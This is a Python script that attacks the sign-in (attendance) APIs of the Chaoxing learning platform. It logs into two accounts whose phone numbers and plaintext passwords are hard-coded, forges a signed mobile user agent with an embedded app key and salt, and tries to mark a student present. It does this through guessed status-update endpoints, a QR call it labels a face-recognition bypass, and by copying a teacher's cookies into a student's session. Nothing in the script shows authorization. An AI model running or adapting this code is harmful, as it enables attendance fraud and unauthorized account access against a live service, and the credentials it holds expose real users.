import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:600]})
    vuln = "修改成功" in detail or "success" in evidence.lower()[:100] or "签到成功" in detail
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:150]}")

def run():
    print("=" * 80)
    print(f"签到状态修改漏洞深入测试 - V2 API + updateqrstatus + 多路径")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"
    base2 = "https://mooc1-api.chaoxing.com"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n[2] 获取签到活动列表...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
    print(f"  找到 {len(active_ids)} 个签到活动")
    for a in active_ids[:5]:
        print(f"    id={a['id']}, type={a['type']}, status={a['status']}, name={a['name']}")

    test_aid = active_ids[0]["id"] if active_ids else "5000163767353"

    print("\n" + "=" * 80)
    print("[3] V2签到API测试")
    print("=" * 80)

    v2_apis = [
        ("GET", f"{base}/v2/apis/sign/signIn",
         {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
         "V2 signIn GET"),
        ("POST", f"{base}/v2/apis/sign/signIn",
         {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
         "V2 signIn POST"),
        ("GET", f"{base}/v2/apis/sign/signIn",
         {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "status": "1"},
         "V2 signIn+status GET"),
        ("POST", f"{base}/v2/apis/sign/signIn",
         {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "status": "1"},
         "V2 signIn+status POST"),
    ]

    for method, url, params, desc in v2_apis:
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=20)
            else:
                r = s_s.post(url, data=params, headers=ajax_hdr, timeout=20)
            rec(f"T3-{desc[:15]}", f"{desc}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
        except Exception as e:
            rec(f"T3-{desc[:15]}", f"{desc}: ERROR {e}")

    for act in active_ids[:5]:
        aid = act["id"]
        try:
            r = s_s.get(f"{base}/v2/apis/sign/signIn",
                        params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                        timeout=20)
            rec(f"T3-v2-{aid[:8]}", f"V2 signIn aid={aid} (type={act['type']}): {r.text[:100]}", r.text[:300])
        except Exception as e:
            rec(f"T3-v2-{aid[:8]}", f"ERROR: {e}")

    print("\n" + "=" * 80)
    print("[4] updateqrstatus API测试（人脸识别绕过模式）")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_s.get(f"{base}/newsign/preSign",
                    params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                    timeout=20)
        uuid_val = ""
        qrc_enc = ""
        if r.status_code == 200 and len(r.text) > 100:
            uuid_match = re.findall(r'uuid["\']?\s*(?:value|=)\s*["\']?([^"\'&\s]+)', r.text)
            qrc_match = re.findall(r'qrcEnc["\']?\s*(?:value|=)\s*["\']?([^"\'&\s]+)', r.text)
            if uuid_match:
                uuid_val = uuid_match[0]
            if qrc_match:
                qrc_enc = qrc_match[0]
            rec(f"T4-preSign-{aid[:8]}", f"preSign: uuid={uuid_val[:30]}, qrcEnc={qrc_enc[:30]}, len={len(r.text)}")

        oid = uuid.uuid4().hex[:32]

        r = s_s.post(f"{base2}/qr/updateqrstatus",
                     data={"clazzId": CLASS_ID, "courseId": COURSE_ID, "uuid": uuid_val or "test",
                           "objectId": oid, "qrcEnc": qrc_enc or "test", "failCount": "0", "compareResult": "0"},
                     headers=ajax_hdr, timeout=20)
        rec(f"T4-qr-{aid[:8]}", f"updateqrstatus aid={aid}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

        r = s_s.post(f"{base2}/mooc-ans/qr/updateqrstatus",
                     data={"clazzId": CLASS_ID, "courseId": COURSE_ID, "uuid": uuid_val or "test",
                           "objectId": oid, "qrcEnc": qrc_enc or "test", "failCount": "0", "compareResult": "0"},
                     headers=ajax_hdr, timeout=20)
        rec(f"T4-qr-mooc-{aid[:8]}", f"updateqrstatus(mooc1-api) aid={aid}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] knowledge/uploadInfo API测试")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        oid = uuid.uuid4().hex[:32]
        r = s_s.post(f"{base2}/knowledge/uploadInfo",
                     data={"clazzId": CLASS_ID, "courseId": COURSE_ID, "knowledgeId": "0",
                           "uuid": "test", "qrcEnc": "test", "objectId": oid},
                     headers=ajax_hdr, timeout=20)
        rec(f"T5-upload-{aid[:8]}", f"uploadInfo aid={aid}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

        r = s_s.post(f"{base2}/mooc-ans/knowledge/uploadInfo",
                     data={"clazzId": CLASS_ID, "courseId": COURSE_ID, "knowledgeId": "0",
                           "uuid": "test", "qrcEnc": "test", "objectId": oid},
                     headers=ajax_hdr, timeout=20)
        rec(f"T5-upload-mooc-{aid[:8]}", f"uploadInfo(mooc1-api) aid={aid}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[6] V2 API更多端点探索")
    print("=" * 80)

    v2_more = [
        ("GET", f"{base}/v2/apis/active/student/activelist", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}),
        ("GET", f"{base}/v2/apis/active/teacher/activelist", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t}),
        ("GET", f"{base}/v2/apis/sign/student/signList", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}),
        ("GET", f"{base}/v2/apis/sign/teacher/signList", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t}),
        ("POST", f"{base}/v2/apis/sign/updateStatus", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/modifyStatus", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/changeStatus", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/signStatus", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s, "status": "1"}),
        ("GET", f"{base}/v2/apis/sign/signStatus", {"activeId": test_aid, "uid": puid_s}),
        ("POST", f"{base}/v2/apis/active/updateStatus", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("GET", f"{base}/v2/apis/active/detail", {"activeId": test_aid, "uid": puid_s}),
        ("POST", f"{base}/v2/apis/sign/makeUpSign", {"activeId": test_aid, "uid": puid_s, "studentId": puid_s}),
    ]

    for i, (method, url, params) in enumerate(v2_more):
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=15)
            else:
                r = s_s.post(url, data=params, headers=ajax_hdr, timeout=15)
            path = url.split("/v2/apis/")[1] if "/v2/apis/" in url else url
            rec(f"T6-{i:02d}", f"V2 {method} {path}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
        except Exception as e:
            rec(f"T6-{i:02d}", f"ERROR: {e}")

    print("\n" + "=" * 80)
    print("[7] signedResult页面详细分析")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_t.get(f"{base}/pptSign/signedResult",
                    params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
                    headers={"Referer": f"{base}/"}, timeout=20)
        if r.status_code == 200 and len(r.text) > 100:
            api_patterns = set(re.findall(r'["\']([^"\']*(?:pptSign|activeAPI|sign|updateStatus|modifySign)[^"\']*)["\']', r.text, re.I))
            ajax_urls = set(re.findall(r'url:\s*["\']([^"\']+)["\']', r.text))
            post_urls = set(re.findall(r'\.post\(["\']([^"\']+)["\']', r.text))
            all_urls = api_patterns | ajax_urls | post_urls
            rec(f"T7-signed-{aid[:8]}", f"signedResult页面API: {all_urls}, len={len(r.text)}", r.text[:500])
        else:
            rec(f"T7-signed-{aid[:8]}", f"signedResult: HTTP {r.status_code}, len={len(r.text)}")

    print("\n" + "=" * 80)
    print("[8] updateSignStatus API - 学生使用教师Cookie（完整Cookie复制）")
    print("=" * 80)

    s_full_hybrid = requests.Session()
    s_full_hybrid.verify = False
    s_full_hybrid.headers.update(s_s.headers.copy())
    s_full_hybrid.cookies.clear()
    for c in s_t.cookies:
        s_full_hybrid.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    cookie_names = [c.name for c in s_full_hybrid.cookies]
    rec("T8-01", f"教师Cookie列表: {cookie_names}")

    r = s_full_hybrid.post(f"{base}/pptSign/updateSignStatus",
                           data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                 "uid": puid_t, "studentId": puid_s, "status": "1"},
                           headers=ajax_hdr, timeout=20)
    rec("T8-02", f"完整教师Cookie: {r.text[:100]}", r.text[:300])

    r = s_full_hybrid.post(f"{base}/pptSign/updateSignStatus",
                           data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                 "uid": puid_t, "studentId": puid_s, "status": "1"},
                           headers={**ajax_hdr, "Cookie": "; ".join(f"{c.name}={c.value}" for c in s_t.cookies)},
                           timeout=20)
    rec("T8-03", f"手动Cookie头: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] updateSignStatus - 学生尝试GET方法")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_s.get(f"{base}/pptSign/updateSignStatus",
                    params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                            "uid": puid_s, "studentId": puid_s, "status": "1"},
                    timeout=20)
        rec(f"T9-get-{aid[:8]}", f"学生GET updateSignStatus aid={aid}: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[10] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deep_sign_v2_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if "修改成功" in r.get("detail", "") or "修改成功" in r.get("evidence", "") or "签到成功" in r.get("detail", ""))
    fail = sum(1 for r in results if "修改失败" in r.get("detail", "") or "修改失败" in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  成功: {success}, 修改失败: {fail}, 无权限: {perm}")

if __name__ == "__main__":
    run()
